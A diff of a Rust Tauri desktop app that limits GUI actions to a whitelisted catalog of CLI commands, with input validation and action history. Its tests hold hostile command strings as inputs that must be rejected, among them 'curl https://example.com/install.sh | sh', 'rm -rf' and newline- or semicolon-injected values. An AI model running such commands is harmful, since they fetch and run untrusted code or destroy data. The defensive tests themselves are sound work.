@@ -1,305 +1,542 @@
-use std::path::PathBuf;
-use std::time::Instant;
+mod commands {
+    use serde::{Deserialize, Serialize};
+    use serde_json::json;
+    use std::fs::{self, OpenOptions};
+    use std::io::Write;
+    use std::path::PathBuf;
+    use std::process::Command;
+    use std::time::{SystemTime, UNIX_EPOCH};
 
-use serde::Serialize;
+    #[derive(Debug, Clone, Serialize, Deserialize)]
+    pub struct CommandResult {
+        pub ok: bool,
+        pub command: String,
+        pub stdout: String,
+        pub stderr: String,
+        pub exit_code: Option<i32>,
+    }
 
-mod storage;
+    #[derive(Debug, Clone, Serialize, Deserialize)]
+    pub struct DesktopAction {
+        pub id: String,
+        pub title: String,
+        pub description: String,
+        pub category: String,
+        pub risk: String,
+        pub command_preview: String,
+        #[serde(skip_serializing)]
+        pub args: Vec<String>,
+    }
 
-#[derive(Debug, Serialize)]
-struct LocalStateStatus {
-    repodesk_home: String,
-    database_path: String,
-    database_exists: bool,
-    schema_version: i64,
-    tables: Vec<String>,
-    mode: String,
-}
+    #[derive(Debug, Clone, Serialize, Deserialize)]
+    pub struct ActionRunResult {
+        pub id: String,
+        pub title: String,
+        pub risk: String,
+        pub category: String,
+        pub started_at_ms: u128,
+        pub finished_at_ms: u128,
+        pub result: CommandResult,
+    }
 
-#[derive(Debug, Clone, Serialize)]
-struct DesktopActionSpec {
-    id: String,
-    label: String,
-    risk: String,
-    description: String,
-}
+    #[derive(Debug, Clone, Serialize, Deserialize)]
+    pub struct ProjectAddInput {
+        pub name: String,
+        pub path: String,
+        pub project_type: String,
+        pub main_language: Option<String>,
+    }
 
-#[derive(Debug, Clone, Serialize)]
-struct DesktopActionResult {
-    action: String,
-    label: String,
-    verdict: String,
-    status: String,
-    duration_ms: i64,
-    output: String,
-    recorded_in_db: bool,
-}
+    fn now_ms() -> u128 {
+        SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .map(|duration| duration.as_millis())
+            .unwrap_or_default()
+    }
 
-#[tauri::command]
-fn dashboard_snapshot() -> Result<serde_json::Value, String> {
-    let snapshot = repodesk_core::dashboard::build_dashboard_snapshot()
-        .map_err(|err| format!("failed to build dashboard snapshot: {err}"))?;
+    fn workspace_root() -> PathBuf {
+        let mut current = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
 
-    serde_json::to_value(snapshot)
-        .map_err(|err| format!("failed to serialize dashboard snapshot: {err}"))
-}
+        for _ in 0..8 {
+            if current.join("Cargo.toml").exists() && current.join("crates/repodesk-cli").exists() {
+                return current;
+            }
 
-#[tauri::command]
-fn security_audit_text() -> Result<String, String> {
-    let audit = repodesk_core::security::audit_security_policy()
-        .map_err(|err| format!("failed to audit security policy: {err}"))?;
+            if !current.pop() {
+                break;
+            }
+        }
 
-    Ok(repodesk_core::security::format_security_audit(&audit))
-}
+        PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+    }
 
-#[tauri::command]
-fn runtime_providers_text() -> Result<String, String> {
-    Ok(repodesk_core::runtime::format_runtime_providers(
-        &repodesk_core::runtime::runtime_providers(),
-    ))
-}
+    fn home_dir() -> PathBuf {
+        std::env::var_os("HOME")
+            .or_else(|| std::env::var_os("USERPROFILE"))
+            .map(PathBuf::from)
+            .unwrap_or_else(workspace_root)
+    }
 
-#[tauri::command]
-fn sandbox_policy_text() -> Result<String, String> {
-    Ok(repodesk_core::sandbox::sandbox_policy())
-}
+    fn history_file() -> PathBuf {
+        home_dir()
+            .join(".repodesk")
+            .join("desktop")
+            .join("action-history.jsonl")
+    }
 
-#[tauri::command]
-fn local_state_status() -> Result<LocalStateStatus, String> {
-    let home = repodesk_home()?;
-    let status =
-        storage::read_db_status(&home).map_err(|err| format!("failed to read DB: {err}"))?;
+    fn truncate_text(value: &str, max_chars: usize) -> String {
+        let char_count = value.chars().count();
+        if char_count <= max_chars {
+            return value.to_string();
+        }
 
-    Ok(LocalStateStatus {
-        repodesk_home: home.display().to_string(),
-        database_path: status.path,
-        database_exists: status.exists,
-        schema_version: status.schema_version,
-        tables: status.tables,
-        mode: "desktop-local-only".to_string(),
-    })
-}
+        let mut truncated: String = value.chars().take(max_chars).collect();
+        truncated.push_str("\n\n[RepoDesk truncated output to keep the UI responsive]");
+        truncated
+    }
 
-#[tauri::command]
-fn init_local_database() -> Result<LocalStateStatus, String> {
-    let home = repodesk_home()?;
-    storage::init_db(&home).map_err(|err| format!("failed to init DB: {err}"))?;
-    local_state_status()
-}
+    pub(crate) fn validate_short_id(label: &str, value: &str) -> Result<(), String> {
+        let trimmed = value.trim();
+        if trimmed.is_empty() {
+            return Err(format!("{label} cannot be empty"));
+        }
 
-#[tauri::command]
-fn desktop_actions() -> Vec<DesktopActionSpec> {
-    allowed_actions()
-}
+        if trimmed.len() > 80 {
+            return Err(format!("{label} is too long"));
+        }
 
-#[tauri::command]
-fn recent_action_runs(limit: Option<usize>) -> Result<Vec<storage::StoredActionRun>, String> {
-    let home = repodesk_home()?;
-    storage::list_action_runs(&home, limit.unwrap_or(12))
-        .map_err(|err| format!("failed to list action runs: {err}"))
-}
+        let safe = trimmed
+            .chars()
+            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_' | '.' | '/'));
 
-#[tauri::command]
-fn run_desktop_action(action: String) -> Result<DesktopActionResult, String> {
-    let spec =
-        action_spec(&action).ok_or_else(|| format!("blocked unknown desktop action: {action}"))?;
-    let start = Instant::now();
+        if !safe {
+            return Err(format!(
+                "{label} may only contain letters, numbers, dash, underscore, dot or slash"
+            ));
+        }
 
-    let run_result = run_allowed_action(&spec.id);
-    let duration_ms = start.elapsed().as_millis().min(i64::MAX as u128) as i64;
+        Ok(())
+    }
 
-    let (status, output) = match run_result {
-        Ok(output) => ("success".to_string(), output),
-        Err(error) => ("failed".to_string(), error),
-    };
+    pub(crate) fn validate_text(label: &str, value: &str, max_len: usize) -> Result<(), String> {
+        let trimmed = value.trim();
+        if trimmed.is_empty() {
+            return Err(format!("{label} cannot be empty"));
+        }
 
-    let result = DesktopActionResult {
-        action: spec.id.clone(),
-        label: spec.label.clone(),
-        verdict: "allow_bounded_action".to_string(),
-        status,
-        duration_ms,
-        output,
-        recorded_in_db: false,
-    };
+        if trimmed.len() > max_len {
+            return Err(format!("{label} is too long"));
+        }
 
-    let mut result = result;
-    if let Ok(home) = repodesk_home() {
-        if storage::record_action_run(
-            &home,
-            &result.action,
-            &result.verdict,
-            &result.status,
-            result.duration_ms,
-            &result.output,
-        )
-        .is_ok()
-        {
-            result.recorded_in_db = true;
+        if trimmed.contains('\0') || trimmed.contains('\n') || trimmed.contains('\r') {
+            return Err(format!("{label} contains unsupported characters"));
+        }
+
+        Ok(())
+    }
+
+    pub(crate) fn validate_path(value: &str) -> Result<(), String> {
+        let trimmed = value.trim();
+        if trimmed.is_empty() {
+            return Err("Path cannot be empty".into());
+        }
+
+        if trimmed.len() > 512 {
+            return Err("Path is too long".into());
+        }
+
+        if trimmed.contains('\0') || trimmed.contains('\n') || trimmed.contains('\r') {
+            return Err("Path contains unsupported characters".into());
+        }
+
+        Ok(())
+    }
+
+    pub(crate) fn action_catalog() -> Vec<DesktopAction> {
+        vec![
+            DesktopAction {
+                id: "workflow-next".into(),
+                title: "Decide next workflow step".into(),
+                description: "Ask the workflow brain what should happen next based on current project state.".into(),
+                category: "Brain".into(),
+                risk: "safe".into(),
+                command_preview: "repodesk workflow next".into(),
+                args: vec!["workflow".into(), "next".into()],
+            },
+            DesktopAction {
+                id: "doctor-workflow".into(),
+                title: "Run workflow doctor".into(),
+                description: "Check project, task, context, prompts, checks, and guard state.".into(),
+                category: "Brain".into(),
+                risk: "safe".into(),
+                command_preview: "repodesk doctor workflow".into(),
+                args: vec!["doctor".into(), "workflow".into()],
+            },
+            DesktopAction {
+                id: "context-build".into(),
+                title: "Build context pack".into(),
+                description: "Create the main task context pack for bounded agent work.".into(),
+                category: "Context".into(),
+                risk: "guarded".into(),
+                command_preview: "repodesk context build".into(),
+                args: vec!["context".into(), "build".into()],
+            },
+            DesktopAction {
+                id: "smart-context-build".into(),
+                title: "Build smart context".into(),
+                description: "Create smaller token-aware context from active task, repo map, and changed files.".into(),
+                category: "Context".into(),
+                risk: "guarded".into(),
+                command_preview: "repodesk smart-context build".into(),
+                args: vec!["smart-context".into(), "build".into()],
+            },
+            DesktopAction {
+                id: "prompt-all".into(),
+                title: "Generate agent prompts".into(),
+                description: "Generate Codex, ChatGPT, and review prompts from the current context.".into(),
+                category: "Context".into(),
+                risk: "guarded".into(),
+                command_preview: "repodesk prompt all".into(),
+                args: vec!["prompt".into(), "all".into()],
+            },
+            DesktopAction {
+                id: "safety-scan-context".into(),
+                title: "Safety scan context".into(),
+                description: "Scan context for secret-like patterns before sending it to any AI system.".into(),
+                category: "Security".into(),
+                risk: "safe".into(),
+                command_preview: "repodesk safety scan-context".into(),
+                args: vec!["safety".into(), "scan-context".into()],
+            },
+            DesktopAction {
+                id: "security-audit".into(),
+                title: "Security audit".into(),
+                description: "Show security policy and blocked or guarded behavior.".into(),
+                category: "Security".into(),
+                risk: "safe".into(),
+                command_preview: "repodesk security audit".into(),
+                args: vec!["security".into(), "audit".into()],
+            },
+            DesktopAction {
+                id: "judge-codex".into(),
+                title: "Judge Codex".into(),
+                description: "Ask the judge whether Codex should be allowed for the current task.".into(),
+                category: "Agent Judge".into(),
+                risk: "guarded".into(),
+                command_preview: "repodesk judge agent --agent codex".into(),
+                args: vec!["judge".into(), "agent".into(), "--agent".into(), "codex".into()],
+            },
+            DesktopAction {
+                id: "judge-chatgpt".into(),
+                title: "Judge ChatGPT".into(),
+                description: "Ask the judge whether ChatGPT should be allowed for the current task.".into(),
+                category: "Agent Judge".into(),
+                risk: "expensive".into(),
+                command_preview: "repodesk judge agent --agent chatgpt".into(),
+                args: vec!["judge".into(), "agent".into(), "--agent".into(), "chatgpt".into()],
+            },
+            DesktopAction {
+                id: "runtime-route-patch".into(),
+                title: "Route patch work".into(),
+                description: "Ask runtime router which provider should handle patch-oriented work.".into(),
+                category: "Runtime".into(),
+                risk: "safe".into(),
+                command_preview: "repodesk runtime route --need patch".into(),
+                args: vec!["runtime".into(), "route".into(), "--need".into(), "patch".into()],
+            },
+            DesktopAction {
+                id: "runtime-route-compression".into(),
+                title: "Route compression work".into(),
+                description: "Ask runtime router which provider should compress or summarize context.".into(),
+                category: "Runtime".into(),
+                risk: "safe".into(),
+                command_preview: "repodesk runtime route --need compression".into(),
+                args: vec!["runtime".into(), "route".into(), "--need".into(), "compression".into()],
+            },
+            DesktopAction {
+                id: "checks-run".into(),
+                title: "Run configured checks".into(),
+                description: "Run configured project checks and produce a compact summary for agents.".into(),
+                category: "Verification".into(),
+                risk: "guarded".into(),
+                command_preview: "repodesk checks run".into(),
+                args: vec!["checks".into(), "run".into()],
+            },
+            DesktopAction {
+                id: "git-audit".into(),
+                title: "Audit git state".into(),
+                description: "Show local git status, branch, remotes, and backup readiness.".into(),
+                category: "Verification".into(),
+                risk: "safe".into(),
+                command_preview: "repodesk git audit".into(),
+                args: vec!["git".into(), "audit".into()],
+            },
+        ]
+    }
+
+    pub(crate) fn find_action(action_id: &str) -> Option<DesktopAction> {
+        action_catalog()
+            .into_iter()
+            .find(|action| action.id == action_id)
+    }
+
+    fn run_cli(args: &[String]) -> CommandResult {
+        let root = workspace_root();
+        let command_preview = format!("cargo run -q -p repodesk-cli -- {}", args.join(" "));
+
+        let output = Command::new("cargo")
+            .arg("run")
+            .arg("-q")
+            .arg("-p")
+            .arg("repodesk-cli")
+            .arg("--")
+            .args(args)
+            .current_dir(&root)
+            .output();
+
+        match output {
+            Ok(output) => CommandResult {
+                ok: output.status.success(),
+                command: command_preview,
+                stdout: truncate_text(&String::from_utf8_lossy(&output.stdout), 12_000),
+                stderr: truncate_text(&String::from_utf8_lossy(&output.stderr), 12_000),
+                exit_code: output.status.code(),
+            },
+            Err(error) => CommandResult {
+                ok: false,
+                command: command_preview,
+                stdout: String::new(),
+                stderr: format!("Failed to run CLI command: {error}"),
+                exit_code: None,
+            },
         }
     }
 
-    Ok(result)
-}
+    fn run_cli_str(args: &[&str]) -> CommandResult {
+        let owned: Vec<String> = args.iter().map(|item| item.to_string()).collect();
+        run_cli(&owned)
+    }
 
-fn run_allowed_action(action: &str) -> Result<String, String> {
-    match action {
-        "workflow_next" => repodesk_core::workflow::workflow_next()
-            .map_err(|err| err.to_string())
-            .map(|text| format!("# Workflow next\n\n{text}")),
-        "build_context" => repodesk_core::context::build_context()
-            .map_err(|err| err.to_string())
-            .map(|result| {
-                format!(
-                    "# Context built\n\nContext: {}\nToken estimate: {}\nEstimated tokens: {}",
-                    result.context_file, result.token_estimate_file, result.estimate.estimated_tokens
-                )
-            }),
-        "build_smart_context" => repodesk_core::smart_context::build_smart_context()
-            .map_err(|err| err.to_string())
-            .map(|result| {
-                format!(
-                    "# Smart context built\n\nContext: {}\nToken estimate: {}\nEstimated tokens: {}\nIncluded files: {}\nSkipped files: {}",
-                    result.context_file.display(),
-                    result.token_estimate_file.display(),
-                    result.estimate.estimated_tokens,
-                    result.included_files.len(),
-                    result.skipped_files.len()
-                )
-            }),
-        "run_checks" => repodesk_core::checks::run_checks()
-            .map_err(|err| err.to_string())
-            .map(|result| {
-                format!(
-                    "# Checks finished\n\nSuccess: {}\nCommands: {}\nLog: {}\nSummary: {}",
-                    result.success,
-                    result.commands.len(),
-                    result.log_file.display(),
-                    result.summary_file.display()
-                )
-            }),
-        "safety_scan_context" => repodesk_core::safety::scan_active_context()
-            .map_err(|err| err.to_string())
-            .map(|report| repodesk_core::safety::format_safety_report(&report)),
-        "judge_codex" => repodesk_core::judge::judge_agent("codex")
-            .map_err(|err| err.to_string())
-            .map(|report| repodesk_core::judge::format_judgement(&report)),
-        "judge_chatgpt" => repodesk_core::judge::judge_agent("chatgpt")
-            .map_err(|err| err.to_string())
-            .map(|report| repodesk_core::judge::format_judgement(&report)),
-        "runtime_route_patch" => Ok(repodesk_core::runtime::format_runtime_route(
-            &repodesk_core::runtime::recommend_runtime("patch"),
-        )),
-        "runtime_route_compression" => Ok(repodesk_core::runtime::format_runtime_route(
-            &repodesk_core::runtime::recommend_runtime("compression"),
-        )),
-        _ => Err(format!("blocked unknown desktop action: {action}")),
+    fn append_history(result: &ActionRunResult) -> Result<(), String> {
+        let path = history_file();
+        if let Some(parent) = path.parent() {
+            fs::create_dir_all(parent).map_err(|error| error.to_string())?;
+        }
+
+        let line = serde_json::to_string(result).map_err(|error| error.to_string())?;
+        let mut file = OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(path)
+            .map_err(|error| error.to_string())?;
+
+        writeln!(file, "{line}").map_err(|error| error.to_string())
+    }
+
+    #[tauri::command]
+    pub fn desktop_actions() -> Vec<DesktopAction> {
+        action_catalog()
+    }
+
+    #[tauri::command]
+    pub fn explain_action(action_id: String) -> Result<String, String> {
+        let action =
+            find_action(&action_id).ok_or_else(|| format!("Unknown action: {action_id}"))?;
+        Ok(format!(
+            "{}\n\nRisk: {}\nCategory: {}\nCommand: {}\n\n{}",
+            action.title, action.risk, action.category, action.command_preview, action.description
+        ))
+    }
+
+    #[tauri::command]
+    pub fn desktop_snapshot() -> serde_json::Value {
+        json!({
+            "mode": "desktop-management-cockpit",
+            "workspace_root": workspace_root().display().to_string(),
+            "generated_at_ms": now_ms(),
+            "actions": action_catalog(),
+            "dashboard": run_cli_str(&["dashboard", "summary"]),
+            "workflow": run_cli_str(&["workflow", "next"]),
+            "doctor": run_cli_str(&["doctor", "workflow"]),
+            "security": run_cli_str(&["security", "audit"]),
+            "runtime": run_cli_str(&["runtime", "providers"]),
+            "git": run_cli_str(&["git", "audit"]),
+            "project_info": run_cli_str(&["project", "info"]),
+            "project_list": run_cli_str(&["project", "list"]),
+            "task_status": run_cli_str(&["task", "status"]),
+            "task_show": run_cli_str(&["task", "show"]),
+            "events": run_cli_str(&["events", "last", "--limit", "5"]),
+            "knowledge": run_cli_str(&["knowledge", "show", "--kind", "decision"]),
+        })
+    }
+
+    #[tauri::command]
+    pub fn run_desktop_action(action_id: String) -> Result<ActionRunResult, String> {
+        let action =
+            find_action(&action_id).ok_or_else(|| format!("Action is not allowed: {action_id}"))?;
+        let started_at_ms = now_ms();
+        let result = run_cli(&action.args);
+        let finished_at_ms = now_ms();
+
+        let run_result = ActionRunResult {
+            id: action.id,
+            title: action.title,
+            risk: action.risk,
+            category: action.category,
+            started_at_ms,
+            finished_at_ms,
+            result,
+        };
+
+        append_history(&run_result)?;
+        Ok(run_result)
+    }
+
+    #[tauri::command]
+    pub fn action_history() -> Vec<ActionRunResult> {
+        let path = history_file();
+        let Ok(content) = fs::read_to_string(path) else {
+            return Vec::new();
+        };
+
+        let mut values: Vec<ActionRunResult> = content
+            .lines()
+            .filter_map(|line| serde_json::from_str::<ActionRunResult>(line).ok())
+            .collect();
+
+        values.reverse();
+        values.truncate(50);
+        values
+    }
+
+    #[tauri::command]
+    pub fn project_info() -> CommandResult {
+        run_cli_str(&["project", "info"])
+    }
+
+    #[tauri::command]
+    pub fn project_list() -> CommandResult {
+        run_cli_str(&["project", "list"])
+    }
+
+    #[tauri::command]
+    pub fn project_use(name: String) -> Result<CommandResult, String> {
+        validate_short_id("Project name", &name)?;
+        Ok(run_cli(&vec![
+            "project".into(),
+            "use".into(),
+            name.trim().into(),
+        ]))
+    }
+
+    #[tauri::command]
+    pub fn project_add(input: ProjectAddInput) -> Result<CommandResult, String> {
+        validate_short_id("Project name", &input.name)?;
+        validate_path(&input.path)?;
+        validate_text("Project type", &input.project_type, 80)?;
+
+        if let Some(language) = input.main_language.as_deref() {
+            if !language.trim().is_empty() {
+                validate_short_id("Main language", language)?;
+            }
+        }
+
+        let mut args = vec![
+            "project".into(),
+            "add".into(),
+            input.name.trim().into(),
+            input.path.trim().into(),
+            "--type".into(),
+            input.project_type.trim().into(),
+        ];
+
+        if let Some(language) = input.main_language {
+            let language = language.trim().to_string();
+            if !language.is_empty() {
+                args.push("--main-language".into());
+                args.push(language);
+            }
+        }
+
+        Ok(run_cli(&args))
+    }
+
+    #[tauri::command]
+    pub fn task_new(title: String) -> Result<CommandResult, String> {
+        validate_text("Task title", &title, 180)?;
+        Ok(run_cli(&vec![
+            "task".into(),
+            "new".into(),
+            title.trim().into(),
+        ]))
+    }
+
+    #[tauri::command]
+    pub fn task_status() -> CommandResult {
+        run_cli_str(&["task", "status"])
+    }
+
+    #[tauri::command]
+    pub fn task_show() -> CommandResult {
+        run_cli_str(&["task", "show"])
     }
 }
 
-fn allowed_actions() -> Vec<DesktopActionSpec> {
-    vec![
-        DesktopActionSpec {
-            id: "workflow_next".to_string(),
-            label: "Workflow next".to_string(),
-            risk: "read-only".to_string(),
-            description: "Ask RepoDesk brain for the next safest development step.".to_string(),
-        },
-        DesktopActionSpec {
-            id: "build_context".to_string(),
-            label: "Build context".to_string(),
-            risk: "bounded file write".to_string(),
-            description: "Generate context.md for the active task.".to_string(),
-        },
-        DesktopActionSpec {
-            id: "build_smart_context".to_string(),
-            label: "Build smart context".to_string(),
-            risk: "bounded file write".to_string(),
-            description: "Generate smaller context from changed files and repo signals."
-                .to_string(),
-        },
-        DesktopActionSpec {
-            id: "safety_scan_context".to_string(),
-            label: "Safety scan".to_string(),
-            risk: "read-only".to_string(),
-            description: "Scan active context for secrets and risky payloads.".to_string(),
-        },
-        DesktopActionSpec {
-            id: "judge_codex".to_string(),
-            label: "Judge Codex".to_string(),
-            risk: "read-only".to_string(),
-            description: "Combine guard, budget and safety checks for Codex.".to_string(),
-        },
-        DesktopActionSpec {
-            id: "judge_chatgpt".to_string(),
-            label: "Judge ChatGPT".to_string(),
-            risk: "read-only".to_string(),
-            description: "Combine guard, budget and safety checks for ChatGPT.".to_string(),
-        },
-        DesktopActionSpec {
-            id: "runtime_route_patch".to_string(),
-            label: "Route patch work".to_string(),
-            risk: "read-only".to_string(),
-            description: "Recommend an AI/runtime for patch-oriented work.".to_string(),
-        },
-        DesktopActionSpec {
-            id: "runtime_route_compression".to_string(),
-            label: "Route compression".to_string(),
-            risk: "read-only".to_string(),
-            description: "Recommend an AI/runtime for context compression.".to_string(),
-        },
-        DesktopActionSpec {
-            id: "run_checks".to_string(),
-            label: "Run configured checks".to_string(),
-            risk: "bounded project command".to_string(),
-            description: "Run only checks configured in the active RepoDesk project.".to_string(),
-        },
-    ]
-}
-
-fn action_spec(action: &str) -> Option<DesktopActionSpec> {
-    allowed_actions().into_iter().find(|spec| spec.id == action)
-}
-
-fn repodesk_home() -> Result<PathBuf, String> {
-    if let Ok(home) = std::env::var("REPODESK_HOME") {
-        return Ok(PathBuf::from(home));
-    }
-
-    let home = dirs::home_dir().ok_or_else(|| "home directory not found".to_string())?;
-    Ok(home.join(".repodesk"))
-}
-
+#[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     tauri::Builder::default()
         .invoke_handler(tauri::generate_handler![
-            dashboard_snapshot,
-            security_audit_text,
-            runtime_providers_text,
-            sandbox_policy_text,
-            local_state_status,
-            init_local_database,
-            desktop_actions,
-            recent_action_runs,
-            run_desktop_action
+            commands::desktop_snapshot,
+            commands::desktop_actions,
+            commands::explain_action,
+            commands::run_desktop_action,
+            commands::action_history,
+            commands::project_info,
+            commands::project_list,
+            commands::project_use,
+            commands::project_add,
+            commands::task_new,
+            commands::task_status,
+            commands::task_show
         ])
         .run(tauri::generate_context!())
-        .expect("error while running RepoDesk desktop app");
+        .expect("error while running tauri application");
 }
 
 #[cfg(test)]
 mod tests {
-    use super::{action_spec, allowed_actions, run_allowed_action};
+    use super::commands;
 
     #[test]
-    fn exposes_only_whitelisted_actions() {
-        let actions = allowed_actions();
-        assert!(actions.iter().any(|action| action.id == "build_context"));
-        assert!(action_spec("rm -rf /tmp/nope").is_none());
+    fn action_catalog_contains_core_workflow_actions() {
+        let actions = commands::action_catalog();
+        assert!(actions.iter().any(|action| action.id == "workflow-next"));
+        assert!(actions.iter().any(|action| action.id == "context-build"));
+        assert!(actions
+            .iter()
+            .any(|action| action.id == "safety-scan-context"));
+        assert!(actions.iter().any(|action| action.id == "prompt-all"));
     }
 
     #[test]
-    fn unknown_action_is_blocked() {
-        let result = run_allowed_action("curl https://example.com/install.sh | sh");
-        assert!(result.is_err());
+    fn unknown_actions_are_not_allowed() {
+        assert!(commands::find_action("rm-rf-root").is_none());
+        assert!(commands::find_action("curl-pipe-shell").is_none());
+        assert!(commands::find_action("unrestricted-shell").is_none());
+    }
+
+    #[test]
+    fn management_validation_blocks_newlines() {
+        assert!(commands::validate_text("Task title", "safe title", 80).is_ok());
+        assert!(commands::validate_text("Task title", "bad\nnext", 80).is_err());
+        assert!(commands::validate_path("/tmp/project").is_ok());
+        assert!(commands::validate_path("/tmp/project\nrm -rf").is_err());
+    }
+
+    #[test]
+    fn project_name_validation_is_conservative() {
+        assert!(commands::validate_short_id("Project", "repodesk").is_ok());
+        assert!(commands::validate_short_id("Project", "repo desk").is_err());
+        assert!(commands::validate_short_id("Project", "repo;rm").is_err());
     }
 }
